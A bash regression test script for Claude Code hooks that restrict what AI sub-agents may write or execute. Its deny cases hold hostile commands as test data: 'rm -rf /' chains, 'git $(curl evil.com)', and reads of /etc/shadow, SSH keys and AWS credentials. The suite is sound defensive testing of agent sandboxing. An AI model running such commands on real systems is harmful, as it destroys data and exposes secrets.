#!/usr/bin/env bash
# Regression suite for hook-pm-write-guard.sh, hook-codex-bash-guard.sh, and hook-codex-write-guard.sh.
#
# Runs each hook script with a stdin payload that simulates the PreToolUse JSON
# Claude Code emits, asserts the exit code, optionally checks for a substring in
# stderr, and (on selected cases) asserts a substring in the audit log.
#
# Audit log is redirected to a per-run temp dir via $CLAUDE_HOOK_LOG_DIR — the
# live ~/.claude/logs/hooks.log is NOT polluted by this suite.
#
# Usage:
#   scripts/test-hooks.sh           # silent unless failures
#   VERBOSE=1 scripts/test-hooks.sh # print every case

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
PMHOOK="$SCRIPT_DIR/hook-pm-write-guard.sh"
CXHOOK="$SCRIPT_DIR/hook-codex-bash-guard.sh"
CXWHOOK="$SCRIPT_DIR/hook-codex-write-guard.sh"
STOP_HOOK="$SCRIPT_DIR/hook-log-claude-usage.sh"
RL_HOOK="$SCRIPT_DIR/hook-save-rate-limits.sh"
MEM_HOOK="$SCRIPT_DIR/hook-inject-memory.sh"
SESSION_HOOK="$SCRIPT_DIR/hook-session-summary.sh"

# --filter <pattern>  run only cases whose name contains <pattern>
# --list              print all case names and exit
FILTER=""
LIST=false
while [[ $# -gt 0 ]]; do
  case "$1" in
    --filter) FILTER="${2:-}"; shift 2 ;;
    --list)   LIST=true; shift ;;
    *) shift ;;
  esac
done

ALL_CASES=()
# Returns 0 (run) or 1 (skip). In --list mode, registers name and skips.
should_run() {
  if $LIST; then
    ALL_CASES+=("$1")
    return 1
  fi
  [[ -z "$FILTER" || "$1" == *"$FILTER"* ]]
}

# Sandbox audit logs.
export CLAUDE_HOOK_LOG_DIR="$(mktemp -d)"
TEST_LOG_FILE="$CLAUDE_HOOK_LOG_DIR/hooks.log"
trap 'rm -rf "$CLAUDE_HOOK_LOG_DIR" "${DISPATCH_TEST_BRIEF:-}" "${DISPATCH_TEST_BIN:-}"' EXIT

# Pin the codex-executor read roots to known values so path tests are
# deterministic regardless of caller environment.
export CLAUDE_HOOK_CODEX_READ_ROOTS="$HOME/github:/tmp"

PASS=0
FAIL=0
FAILED_CASES=()

# run_case <name> <expected_exit> <hook_path> <json_input> [<expected_stderr_substring>]
run_case() {
  local name="$1" expect_exit="$2" hook="$3" json="$4" expect_stderr="${5:-}"
  should_run "$name" || return 0
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  printf '%s' "$json" | "$hook" 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then pass=0; fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then pass=0; fi

  if [[ "$pass" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
    printf '        expected: exit=%s' "$expect_exit"
    [[ -n "$expect_stderr" ]] && printf ' stderr~="%s"' "$expect_stderr"
    printf '\n        actual:   exit=%s' "$actual_exit"
    [[ -n "$actual_stderr" ]] && printf ' stderr=%q' "${actual_stderr:0:200}"
    printf '\n'
  fi
}

# run_case_env <name> <expected_exit> <env_var=value> <hook_path> <json_input>
run_case_env() {
  local name="$1" expect_exit="$2" envspec="$3" hook="$4" json="$5"
  should_run "$name" || return 0
  local actual_exit
  actual_exit=$(printf '%s' "$json" | env "$envspec" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$hook" >/dev/null 2>&1; echo $?)
  if [[ "$actual_exit" == "$expect_exit" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (expected exit=%s, got exit=%s)\n' "$name" "$expect_exit" "$actual_exit"
  fi
}

# run_command_case <name> <expected_exit> <expected_stderr_substring> <cmd> [args...]
run_command_case() {
  local name="$1" expect_exit="$2" expect_stderr="$3"
  should_run "$name" || return 0
  shift 3
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  "$@" >/dev/null 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then pass=0; fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then pass=0; fi

  if [[ "$pass" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
    printf '        expected: exit=%s' "$expect_exit"
    [[ -n "$expect_stderr" ]] && printf ' stderr~="%s"' "$expect_stderr"
    printf '\n        actual:   exit=%s' "$actual_exit"
    [[ -n "$actual_stderr" ]] && printf ' stderr=%q' "${actual_stderr:0:200}"
    printf '\n'
  fi
}

# assert_log <name> <expected_substring>
# Asserts the test log file contains the substring SOMEWHERE in any line.
assert_log() {
  local name="$1" needle="$2"
  should_run "$name" || return 0
  if [[ -f "$TEST_LOG_FILE" ]] && grep -q -F -- "$needle" "$TEST_LOG_FILE"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (log missing substring: %q)\n' "$name" "$needle"
  fi
}

# truncate_log — used between sub-suites so audit-content assertions are local.
truncate_log() { : > "$TEST_LOG_FILE"; }

make_stop_home() {
  local tmp_home
  tmp_home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/stop-home.XXXXXX")"
  mkdir -p "$tmp_home/.claude/scripts"
  ln -s "$SCRIPT_DIR/log-usage.sh" "$tmp_home/.claude/scripts/log-usage.sh"
  printf '%s\n' "$tmp_home"
}

mem_path="$HOME/.claude/projects/test-project/memory/foo.md"
code_path="$REPO_ROOT/agents/project-pm.md"

# =============================================================================
# pm-write-guard
# =============================================================================

$LIST || echo "== hook-pm-write-guard =="

run_case "pm: Edit memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Write memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Edit code (outside memory) → deny" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" \
  "outside memory directory"

run_case "pm: Write to /tmp → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/oops.md"}}' \
  "outside memory directory"

run_case "pm: Edit memory/../../etc/passwd → deny (realpath normalizes)" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.claude/projects/test-project/memory/../../../etc/passwd\"}}" \
  "outside memory directory"

run_case "pm: Edit memory-evil/x.md → deny (no prefix collision)" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.claude/projects/test-project/memory-evil/x.md\"}}" \
  "outside memory directory"

run_case "pm: relative file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":"foo.md"}}' \
  "must be absolute"

run_case "pm: empty file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":""}}' \
  "empty"

run_case "pm: missing tool_input → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit"}' \
  "empty"

run_case "pm: malformed JSON → deny" 2 "$PMHOOK" \
  'not json at all' \
  "malformed JSON"

# Type confusion (qa medium): array-typed agent_type → no-op (jq -r returns
# the JSON-encoded string of the array, which won't equal "project-pm").
run_case "pm: agent_type as array → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":[\"project-pm\"],\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: agent_type null → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":null,\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: critic Edit anywhere → no-op (allow)" 0 "$PMHOOK" \
  '{"agent_type":"critic","tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: codex-executor Write anywhere → no-op" 0 "$PMHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: main thread (no agent_type) → no-op" 0 "$PMHOOK" \
  '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: project-pm Bash → no-op (matcher would not fire it)" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"ls"}}'

run_case "pm: project-pm Read → no-op" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

run_case_env "pm: bypass via CLAUDE_HOOK_PM_GUARD=off" 0 "CLAUDE_HOOK_PM_GUARD=off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=Off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

# Audit-log content assertions for pm-guard.
truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains allow line" "decision=allow"

truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains deny line with reason" "decision=deny"
assert_log "pm: audit log includes target file_path" "$code_path"

truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | env CLAUDE_HOOK_PM_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "pm: bypass line records project-pm (not '?')" "agent=project-pm"

# =============================================================================
# codex-write-guard
# =============================================================================

echo
$LIST || echo "== hook-codex-write-guard =="
truncate_log

# --- happy path: Write/Edit to /tmp/brief-*.md ---
run_case "cxw: Write /tmp/brief-task.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.md"}}'

run_case "cxw: Write /tmp/brief-seed-postal-fix.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-seed-postal-fix.md"}}'

run_case "cxw: Edit /tmp/brief-task.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Edit","tool_input":{"file_path":"/tmp/brief-task.md"}}'

# --- denied: source tree / home dir ---
run_case "cxw: Write source file → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/backend/seeds/100_demo_content.sql"}}'

run_case "cxw: Edit source file → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Edit","tool_input":{"file_path":"/home/example/github/claude-config/agents/codex-executor.md"}}'

run_case "cxw: Write /tmp/other.md (not brief-prefixed) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/other.md"}}'

run_case "cxw: Write /tmp/brief-task.txt (not .md) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.txt"}}'

run_case "cxw: Write /tmp/brief- (no suffix) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-"}}'

run_case "cxw: Write /etc/passwd → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}'

# --- traversal: /tmp/brief-../../../etc/passwd.md normalizes outside /tmp ---
run_case "cxw: Write path traversal via brief prefix → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-/../etc/shadow.md"}}'

# --- no-op for other agents ---
run_case "cxw: project-pm Write anywhere → no-op (pm guard handles it)" 0 "$CXWHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "cxw: critic Write anywhere → no-op" 0 "$CXWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

run_case "cxw: main thread (no agent_type) Write → no-op" 0 "$CXWHOOK" \
  '{"tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

run_case "cxw: codex-executor Bash → no-op (matcher would not fire it)" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /tmp"}}'

# --- edge cases ---
run_case "cxw: empty file_path → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":""}}'

run_case "cxw: relative file_path → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"brief-task.md"}}'

run_case "cxw: malformed JSON → deny" 2 "$CXWHOOK" \
  'not-json'

# --- symlink attack: /tmp/brief-*.md exists as a symlink to a protected path ---
_cxw_symlink_target="$(mktemp)"
_cxw_symlink_brief="$(mktemp -u /tmp/brief-XXXXXX.md)"
ln -s "$_cxw_symlink_target" "$_cxw_symlink_brief"
run_case "cxw: Write to existing symlink /tmp/brief-*.md → deny" 2 "$CXWHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_cxw_symlink_brief\"}}"
rm -f "$_cxw_symlink_brief" "$_cxw_symlink_target"
unset _cxw_symlink_target _cxw_symlink_brief

# --- bypass ---
run_case_env "cxw: bypass via CLAUDE_HOOK_CODEX_WRITE_GUARD=off" 0 "CLAUDE_HOOK_CODEX_WRITE_GUARD=off" "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

# --- audit-log content assertions ---
truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.md"}}' | "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains allow line" "decision=allow"
assert_log "cxw: allow line records agent=codex-executor" "agent=codex-executor"
assert_log "cxw: allow line records tool=Write" "tool=Write"

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}' | "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains deny line" "decision=deny"
assert_log "cxw: deny line records agent=codex-executor" "agent=codex-executor"

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}' | env CLAUDE_HOOK_CODEX_WRITE_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains bypass line" "decision=bypass"
assert_log "cxw: bypass line records agent=codex-executor" "agent=codex-executor"

# =============================================================================
# codex-bash-guard
# =============================================================================

echo
$LIST || echo "== hook-codex-bash-guard =="
truncate_log

dispatch_abs="$SCRIPT_DIR/codex-dispatch.sh"
export CLAUDE_HOOK_DISPATCH_ABS="$dispatch_abs"
_abs_no_home="${dispatch_abs#"$HOME/"}"
dispatch_tilde="~/$_abs_no_home"
unset _abs_no_home
DISPATCH_TEST_BRIEF="$(mktemp /tmp/codex-dispatch-brief.XXXXXX.md)"
DISPATCH_TEST_BIN="$(mktemp -d)"
printf 'Task with quotes "ok", parens (ok), and\nmultiple lines.\n' > "$DISPATCH_TEST_BRIEF"
cat > "$DISPATCH_TEST_BIN/codex" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

last=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --output-last-message)
      last="$2"
      shift 2
      ;;
    *)
      shift
      ;;
  esac
done

brief="$(cat)"
if [[ "$brief" != *'Task with quotes "ok", parens (ok), and'* || "$brief" != *'multiple lines.'* ]]; then
  exit 23
fi
[[ -n "$last" ]] && printf 'fake final\n' > "$last"
exit 0
EOF
chmod +x "$DISPATCH_TEST_BIN/codex"

# --- happy path ---
run_case "cx: dispatch (absolute) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_abs --cd /tmp -- brief\"}}"

run_case "cx: dispatch (tilde) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp -- brief\"}}"

run_case "cx: dispatch_brief_file_allowed → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file /tmp/brief.md --skip-git-check\"}}"

run_case "cx: dispatch --brief-file=/tmp/brief.md → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file=/tmp/brief.md --skip-git-check\"}}"

run_case "cx: dispatch_brief_file_outside_read_root_denied → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file /etc/passwd --skip-git-check\"}}" \
  "outside read roots"

run_case "cx: dispatch --brief-file=/etc/passwd → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file=/etc/passwd --skip-git-check\"}}" \
  "outside read roots"

run_command_case "dispatch_both_brief_forms_rejected" 2 "mutually exclusive" \
  "$dispatch_abs" --cd /tmp --brief-file "$DISPATCH_TEST_BRIEF" -- brief

run_command_case "dispatch_brief_file_reads_file" 0 "$DISPATCH_TEST_BRIEF (file)" \
  env PATH="$DISPATCH_TEST_BIN:$PATH" "$dispatch_abs" --cd /tmp --brief-file "$DISPATCH_TEST_BRIEF" --timeout 0 --skip-git-check

run_case "cx: git status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git log → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --oneline -5"}}'

run_case "cx: git -C dir status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp status --short"}}'

run_case "cx: git -C dir diff --stat → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp diff --stat"}}'

run_case "cx: cat file under read root → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/trace.jsonl"}}'

run_case "cx: jq parse on read-root file → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -r .type /tmp/trace.jsonl"}}'

run_case "cx: sleep 10 → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sleep 10"}}'

run_case "cx: pwd → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"pwd"}}'

run_case "cx: relative path under codex CWD → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat .agent-trace/latest.jsonl"}}'

# --- security: per-metachar isolated coverage ---
run_case "cx: SOLO ;  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO &  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status & sleep 1"}}' \
  "shell metacharacter"

run_case "cx: SOLO |  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status | sh"}}' \
  "shell metacharacter"

run_case "cx: SOLO \$  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo $HOME"}}' \
  "shell metacharacter"

run_case "cx: SOLO backtick → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo `whoami`"}}' \
  "shell metacharacter"

run_case "cx: SOLO ( → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo (foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO ) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo foo)"}}' \
  "shell metacharacter"

run_case "cx: SOLO < (input redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat </tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO > (output redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status >/tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO { (brace expansion) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo {a,b}"}}' \
  "shell metacharacter"

run_case "cx: SOLO \\\\ (backslash) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo \\foo"}}' \
  "shell metacharacter"

# Newline / CR handled in distinct branches.
run_case "cx: command with newline → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /"}}' \
  "newline"

run_case "cx: command with CR → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\rrm -rf /"}}' \
  "carriage return"

# Composition aliases that combine multiple metachars; each previously demonstrated as bypass.
run_case "cx: git status; rm -rf / → deny (semicolon)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git status && rm -rf / → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status && rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git \$(curl evil) → deny (cmd subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git $(curl evil.com)"}}' \
  "shell metacharacter"

run_case "cx: cat <(...) → deny (process subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat <(cat /etc/passwd)"}}' \
  "shell metacharacter"

run_case "cx: cd /tmp && cmd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cd /tmp && git status"}}' \
  "shell metacharacter"

# --- security: exfiltration via read-only verbs (NEW v3) ---
run_case "cx: cat /etc/shadow → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/shadow"}}' \
  "outside read roots"

run_case "cx: cat /etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}' \
  "outside read roots"

run_case "cx: cat ~/.ssh/id_rsa → deny (tilde rejected)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' \
  "tilde path"

run_case "cx: cat /home/example/.aws/credentials → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /home/example/.aws/credentials"}}' \
  "outside read roots"

run_case "cx: grep secret /home/example/.netrc → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep secret /home/example/.netrc"}}' \
  "outside read roots"

run_case "cx: ls /home/example/.config → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/example/.config"}}' \
  "outside read roots"

# --- security: glob rejection ---
run_case "cx: cat * → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat *"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/*.log → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/*.log"}}' \
  "glob char in arg"

run_case "cx: ls /home/?/.ssh → deny (?)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/?/.ssh"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/[abc]/x → deny ([)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/[abc]/x"}}' \
  "glob char in arg"

# --- security: destructive git ---
run_case "cx: git push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
  "not in read-only allowlist"

run_case "cx: git push --force → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' \
  "not in read-only allowlist"

run_case "cx: git reset --hard → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git reset --hard"}}' \
  "not in read-only allowlist"

run_case "cx: git commit -am → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git commit -am msg"}}' \
  "not in read-only allowlist"

run_case "cx: git rebase main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git rebase main"}}' \
  "not in read-only allowlist"

run_case "cx: git checkout main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git checkout main"}}' \
  "not in read-only allowlist"

run_case "cx: git merge other → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git merge other"}}' \
  "not in read-only allowlist"

run_case "cx: git branch -D foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -D foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -d foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -a → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git branch --show-current → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch --show-current"}}'

# --- security: git stash subverbs (NEW v3) ---
run_case "cx: git stash list → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

run_case "cx: git stash show → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash show"}}'

run_case "cx: bare git stash → deny (mutating default)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash"}}' \
  "bare 'git stash' is mutating"

run_case "cx: git stash push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash push -m foo"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash drop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash drop"}}' \
